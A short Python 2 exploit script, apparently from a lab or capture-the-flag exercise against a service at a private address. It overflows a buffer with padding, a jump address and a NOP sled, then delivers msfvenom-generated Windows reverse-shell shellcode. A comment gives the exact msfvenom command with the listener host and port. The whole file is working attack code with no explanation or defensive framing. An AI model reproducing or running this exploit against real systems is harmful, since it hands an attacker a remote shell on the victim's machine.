#!/usr/bin/env python2
import socket

target_host = "10.0.2.7"
target_port = 42424
jmp = "\xc3\x14\x04\x08"
nops = "\x90" * 15 

# 08-03-2020 DC:  I created this shellcode with the following command:
# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00\x0A"

shellcode = (
"\xdb\xc7\xb8\xa3\x79\xea\x9b\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x52\x31\x43\x17\x03\x43\x17\x83\x60\x7d\x08\x6e\x9a\x96\x4e"
"\x91\x62\x67\x2f\x1b\x87\x56\x6f\x7f\xcc\xc9\x5f\x0b\x80\xe5"
"\x14\x59\x30\x7d\x58\x76\x37\x36\xd7\xa0\x76\xc7\x44\x90\x19"
"\x4b\x97\xc5\xf9\x72\x58\x18\xf8\xb3\x85\xd1\xa8\x6c\xc1\x44"
"\x5c\x18\x9f\x54\xd7\x52\x31\xdd\x04\x22\x30\xcc\x9b\x38\x6b"
"\xce\x1a\xec\x07\x47\x04\xf1\x22\x11\xbf\xc1\xd9\xa0\x69\x18"
"\x21\x0e\x54\x94\xd0\x4e\x91\x13\x0b\x25\xeb\x67\xb6\x3e\x28"
"\x15\x6c\xca\xaa\xbd\xe7\x6c\x16\x3f\x2b\xea\xdd\x33\x80\x78"
"\xb9\x57\x17\xac\xb2\x6c\x9c\x53\x14\xe5\xe6\x77\xb0\xad\xbd"
"\x16\xe1\x0b\x13\x26\xf1\xf3\xcc\x82\x7a\x19\x18\xbf\x21\x76"
"\xed\xf2\xd9\x86\x79\x84\xaa\xb4\x26\x3e\x24\xf5\xaf\x98\xb3"
"\xfa\x85\x5d\x2b\x05\x26\x9e\x62\xc2\x72\xce\x1c\xe3\xfa\x85"
"\xdc\x0c\x2f\x09\x8c\xa2\x80\xea\x7c\x03\x71\x83\x96\x8c\xae"
"\xb3\x99\x46\xc7\x5e\x60\x01\xe2\x9e\x68\xde\x9a\x9c\x6c\xf1"
"\x06\x28\x8a\x9b\xa6\x7c\x05\x34\x5e\x25\xdd\xa5\x9f\xf3\x98"
"\xe6\x14\xf0\x5d\xa8\xdc\x7d\x4d\x5d\x2d\xc8\x2f\xc8\x32\xe6"
"\x47\x96\xa1\x6d\x97\xd1\xd9\x39\xc0\xb6\x2c\x30\x84\x2a\x16"
"\xea\xba\xb6\xce\xd5\x7e\x6d\x33\xdb\x7f\xe0\x0f\xff\x6f\x3c"
"\x8f\xbb\xdb\x90\xc6\x15\xb5\x56\xb1\xd7\x6f\x01\x6e\xbe\xe7"
"\xd4\x5c\x01\x71\xd9\x88\xf7\x9d\x68\x65\x4e\xa2\x45\xe1\x46"
"\xdb\xbb\x91\xa9\x36\x78\xb1\x4b\x92\x75\x5a\xd2\x77\x34\x07"
"\xe5\xa2\x7b\x3e\x66\x46\x04\xc5\x76\x23\x01\x81\x30\xd8\x7b"
"\x9a\xd4\xde\x28\x9b\xfc")


payload = "A" * 146 + jmp + nops + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_host, target_port))

s.send(payload + "\r\n")
s.close()
